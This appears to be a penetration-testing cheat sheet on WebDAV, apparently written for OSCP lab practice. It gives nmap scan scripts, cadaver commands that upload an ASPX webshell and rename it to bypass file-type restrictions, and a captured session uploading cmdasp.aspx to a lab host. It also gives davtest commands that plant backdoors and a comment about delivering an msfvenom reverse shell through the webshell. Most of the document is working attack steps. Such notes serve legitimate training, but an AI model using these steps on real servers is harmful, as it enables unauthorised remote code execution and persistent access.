# WebDAV

## Scanning

### nmap

```bash
nmap <IP> --script=http-webdav-scan,http-iis-webdav-vuln
# Check for the HTTP Methods especially for PUT
```

### cadaver

```bash
cadaver <IP>
dav:/> put /usr/share/webshells/aspx/cmdasp.aspx awen.txt  # Example uploading shell
dav:/> mv awen.txt awen.aspx  # Change the file type of the uploaded file
# Navigate to the awen.aspx file in the browser
```

```bash
kali@kali:~/Documents/offsec/oscp/proving_grounds/Hutch$ cadaver 192.168.71.122
Authentication required for 192.168.71.122 on server `192.168.71.122':
Username: <USERNAME>
Password: <PASSWORD>
dav:/> put /usr/share/webshells/aspx/cmdasp.aspx cmdasp.aspx
Uploading /usr/share/webshells/aspx/cmdasp.aspx to `/cmdasp.aspx':
Progress: [=============================>] 100.0% of 1400 bytes succeeded.
# Navigate to the cmdasp.aspx file in the browser
# Can then create a reverse shell payload with msfvenom, upload that using dav,
# then call it from the cmdasp.aspx page using the full path
```

### davtest

```bash
davtest --url http://<IP>
davtest -move -sendbd auto -url http://<IP>:8080/webdav/
```

###
